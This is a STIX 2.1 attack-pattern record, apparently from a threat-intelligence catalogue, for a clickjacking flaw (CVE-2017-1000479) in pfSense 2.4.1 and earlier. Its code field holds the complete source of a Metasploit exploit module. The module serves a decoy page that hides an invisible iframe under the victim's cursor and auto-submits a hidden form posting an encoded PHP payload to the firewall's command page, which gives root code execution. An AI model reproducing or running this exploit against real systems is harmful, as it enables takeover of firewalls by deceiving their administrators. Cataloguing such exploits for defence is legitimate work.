{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--753bea9a-6193-42f2-bb4d-249d3a22d7fc",
    "created": "2024-08-14T17:14:56.455636Z",
    "modified": "2024-08-14T17:14:56.45564Z",
    "name": "Clickjacking Vulnerability In CSRF Error Page pfSense",
    "description": " This module exploits a Clickjacking vulnerability in pfSense <= 2.4.1.  pfSense is a free and open source firewall and router. It was found that the pfSense WebGUI is vulnerable to Clickjacking. By tricking an authenticated admin into interacting with a specially crafted webpage it is possible for an attacker to execute arbitrary code in the WebGUI. Since the WebGUI runs as the root user this will result in a full compromise of the pfSense instance. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/pfsense_clickjacking.rb",
            "external_id": "pfsense_clickjacking.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-1000479"
        },
        {
            "source_name": "reference",
            "url": "https://securify.nl/en/advisory/SFY20171101/clickjacking-vulnerability-in-csrf-error-page-pfsense.html"
        },
        {
            "source_name": "reference",
            "url": "https://doc.pfsense.org/index.php/2.4.2_New_Features_and_Changes"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'            => 'Clickjacking Vulnerability In CSRF Error Page pfSense',\n        'Description'     => %q{\n          This module exploits a Clickjacking vulnerability in pfSense <= 2.4.1.\n\n          pfSense is a free and open source firewall and router. It was found that the\n          pfSense WebGUI is vulnerable to Clickjacking. By tricking an authenticated admin\n          into interacting with a specially crafted webpage it is possible for an attacker\n          to execute arbitrary code in the WebGUI. Since the WebGUI runs as the root user,\n          this will result in a full compromise of the pfSense instance.\n        },\n        'Author'          => 'Yorick Koster',\n        'Payload'         => { 'BadChars' => '\"' },\n        'License'         => MSF_LICENSE,\n        'References'      =>\n          [\n            ['CVE', '2017-1000479'],\n            ['URL', 'https://securify.nl/en/advisory/SFY20171101/clickjacking-vulnerability-in-csrf-error-page-pfsense.html'],\n            ['URL', 'https://doc.pfsense.org/index.php/2.4.2_New_Features_and_Changes']\n          ],\n        'DefaultOptions'  =>\n          {\n            'EXITFUNC'    => 'process'\n          },\n        'Arch'            => ARCH_PHP,\n        'Platform'        => 'php',\n        'Targets'         =>\n          [\n            [ 'pfSense <= 2.4.1', { 'auto' => false } ]\n          ],\n        'DefaultTarget'   => 0,\n        'DisclosureDate'  => '2017-11-21'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to the web application', 'https://192.168.1.1'])\n      ]\n    )\n  end\n\n  def js_file\n    @js ||= lambda {\n      path = File.join(Msf::Config.data_directory, 'exploits', 'pfsense_clickjacking', 'cookieconsent.min.js')\n      return File.read(path)\n    }.call\n  end\n\n  def css_file\n    @css ||= lambda {\n      path = File.join(Msf::Config.data_directory, 'exploits', 'pfsense_clickjacking', 'cookieconsent.min.css')\n      return File.read(path)\n    }.call\n  end\n\n  def background_file\n    @background ||= lambda {\n      path = File.join(Msf::Config.data_directory, 'exploits', 'pfsense_clickjacking', 'background.jpg')\n      return File.read(path)\n    }.call\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"GET #{request.uri} #{request.headers['User-Agent']}\")\n\n    resp = create_response(200, \"OK\")\n    if request.uri =~ /\\.js$/\n      resp.body = js_file\n      resp['Content-Type'] = 'text/javascript'\n\n    elsif request.uri =~ /\\.css$/\n      resp.body = css_file\n      resp['Content-Type'] = 'text/css'\n\n    elsif request.uri =~ /\\.jpg$/\n      resp.body = background_file\n      resp['Content-Type'] = 'image/jpg'\n\n    else\n      if datastore['TARGETURI'].end_with? '/'\n        url = datastore['TARGETURI'] + 'diag_command.php'\n      else\n        url = datastore['TARGETURI'] + '/diag_command.php'\n      end\n      framename = rand_text_alpha(16)\n      divname = rand_text_alpha(16)\n      resp.body = %Q|<!DOCTYPE html>\n<html>\n<meta charset=\"utf-8\">\n<link rel=\"stylesheet\" type=\"text/css\" href=\"#{get_resource.chomp('/')}/cookieconsent.min.css\" />\n<script src=\"#{get_resource.chomp('/')}/cookieconsent.min.js\"></script>\n<script>\nwindow.addEventListener(\"load\", function(){\nwindow.cookieconsent.initialise({\n        \"palette\": {\n                \"popup\": {\n                        \"background\": \"#000\",\n                        \"text\": \"#0f0\"\n                },\n                \"button\": {\n                        \"background\": \"#0f0\"\n                }\n        },\n        \"position\": \"top\",\n        \"static\": true\n        });\n});\n</script>\n<script>\ndocument.cookie = 'cookieconsent_status=; expires=Thu, 01 Jan 1970 00:00:01 GMT;';\nwindow.addEventListener('load', function(){\n        document.forms[0].post.click();\n        document.onmousemove = function(e) {\n                var e = e \\|\\| window.event;\n                var s = document.getElementById('#{divname}');\n                s.style.left  = (e.clientX - 10) + 'px';\n                s.style.top = (e.clientY - 5) + 'px';\n        };\n});\n</script>\n<body style=\"background-image:url(#{get_resource.chomp('/')}/background.jpg);background-size:cover;\">\n<div id=\"#{divname}\" style=\"position:absolute;z-index:10;border:none;width:20px;height:10px;overflow:hidden;opacity:0.0;\">\n<iframe src=\"about:blank\" name=\"#{framename}\" sandbox=\"allow-forms\" border=\"no\" scrolling=\"no\" width=\"800\" height=\"800\" style=\"width:400px;height:800px;margin-top:-70px;margin-left:-40px;\"></iframe>\n</div>\n<div style=\"display:none\">\n<form action=\"#{url}\" method=\"POST\" enctype=\"multipart/form-data\" target=\"#{framename}\">\n        <input type=\"hidden\" name=\"txtPHPCommand\" value=\"#{payload.encoded}\" />\n        <input type=\"hidden\" name=\"submit\" value=\"EXECPHP\" />\n        <input type=\"submit\" name=\"post\"/>\n</form>\n</div>\n</body>\n</html>\n|\n      resp['Content-Type'] = 'text/html'\n    end\n\n    cli.send_response(resp)\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-11-21",
    "x_mitre_platforms": [
        "php'"
    ]
}